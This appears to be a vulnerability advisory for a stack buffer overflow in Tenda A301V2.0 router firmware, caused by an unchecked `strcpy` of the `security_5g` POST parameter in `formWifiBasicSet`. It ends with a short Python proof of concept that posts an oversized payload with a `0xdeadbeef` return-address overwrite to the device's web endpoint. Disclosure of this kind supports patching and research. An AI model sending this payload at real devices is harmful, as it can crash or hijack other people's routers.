## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3328.html

## Affected version

A301V2.0 Firmware V15.13.08.12

## Vulnerability details

In the Tenda A301V2.0 Firmware V15.13.08.12 has a stack overflow vulnerability in the `formWifiBasicSet` function. The `src` variable receives the `security_5g` parameter from a POST request and is later assigned to the `dest` variable, which is fixed at 256 bytes. However, since the user can control the input of `security_5g`, the statement `strcpy(dest, src);` can cause a buffer overflow. The user-provided `security_5g` can exceed the capacity of the `dest` array, triggering this security vulnerability.

![image-20240304212400706](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240304212400706.png)

![image-20240304211549237](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240304211549237.png)

![image-20240304211639911](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240304211639911.png)

## PoC

```python
import requests


url = 'http://192.168.84.101/goform/WifiBasicSet'
payload = b'a' * 500 + p32(0xdeadbeef)
data = {
    'security_5g':payload, 
    'hideSsid':'1', 
    'ssid':'1',
    'security':'1', 
    'wrlPwd':'1', 
    'hideSsid_5g':'1', 
    'ssid_5g':'1', 
    'wrlPwd_5g': '1'
}

requests.post(url, data=data)
```

![image-20240304213056127](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240304213056127.png)